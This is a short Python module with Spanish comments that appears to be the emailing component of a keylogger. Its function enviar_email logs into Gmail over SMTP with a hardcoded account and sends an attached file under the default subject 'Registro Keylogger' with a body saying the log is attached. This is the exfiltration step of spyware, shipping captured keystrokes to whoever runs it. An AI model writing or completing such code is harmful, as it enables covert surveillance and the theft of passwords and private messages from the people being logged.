import yagmail
import traceback

def enviar_email(destinatario: str, archivo_adjunto: str, asunto: str = "Registro Keylogger", cuerpo: str = "Se adjunta el registro."):
   
    try:
        yag = yagmail.SMTP(
            user="arizdelcylizbeth170@gmail.com",         # cuenta de gmail
           # la contrasena generada en contrasena de aplicacion generada no va funcionar hasta que generes la tuya o hacemos otra xd ajajaj
            password="",
            host="smtp.gmail.com",
            port=587,
            smtp_starttls=True,
            smtp_ssl=False
        )

        print(f"[email_handler] Conectando a SMTP y enviando a {destinatario}…")
        yag.send(
            to=destinatario,
            subject=asunto,
            contents=cuerpo,
            attachments=archivo_adjunto
        )
        print(f"[email_handler] Correo enviado exitosamente a {destinatario}")

    except Exception:
        print("[email_handler] Error al enviar el correo:")
        traceback.print_exc()
